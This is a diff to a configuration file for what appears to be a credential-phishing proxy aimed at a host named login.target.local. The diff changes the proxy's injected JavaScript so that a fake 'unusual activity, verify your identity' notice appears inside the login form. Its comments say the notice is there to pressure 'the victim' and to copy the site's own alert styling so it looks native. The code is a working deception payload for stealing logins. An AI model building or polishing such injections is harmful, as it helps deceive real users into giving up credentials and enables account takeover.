@@ -51,16 +51,18 @@ intercept:
     body:         '{"status":"ok"}'
 
 js_inject:
-  # Inject a fake security banner on the login page to add urgency. The victim
-  # sees it while filling in their credentials — well before session completion.
+  # Inject a fake security notice inside the login card to add urgency. Uses the
+  # same Tailwind classes as the page's own alert banners so it looks native.
   - trigger_domain: login.target.local
     trigger_path:   "^/login"
     script: |
       (function() {
-        var b = document.createElement("div");
-        b.style.cssText = "background:#fef3c7;border-bottom:1px solid #fcd34d;padding:10px 32px;font-size:13px;color:#92400e;";
-        b.innerHTML = "<strong>Security notice:</strong> Unusual activity detected on your account. Please verify your identity.";
-        document.body.insertBefore(b, document.body.firstChild);
+        var form = document.querySelector("form");
+        if (!form) return;
+        var d = document.createElement("div");
+        d.className = "bg-amber-50 border border-amber-200 text-amber-700 text-sm rounded-lg px-3 py-2.5 mb-4 flex items-start gap-2";
+        d.innerHTML = '<svg class="w-4 h-4 mt-0.5 shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M8.485 2.495c.673-1.167 2.357-1.167 3.03 0l6.28 10.875c.673 1.167-.168 2.625-1.516 2.625H3.72c-1.347 0-2.189-1.458-1.515-2.625L8.485 2.495zM10 6a.75.75 0 01.75.75v3.5a.75.75 0 01-1.5 0v-3.5A.75.75 0 0110 6zm0 8a1 1 0 100-2 1 1 0 000 2z" clip-rule="evenodd"/></svg><span>Unusual activity detected on your account. Please verify your identity to continue.</span>';
+        form.insertBefore(d, form.firstChild);
       })();
 
 auth_tokens:
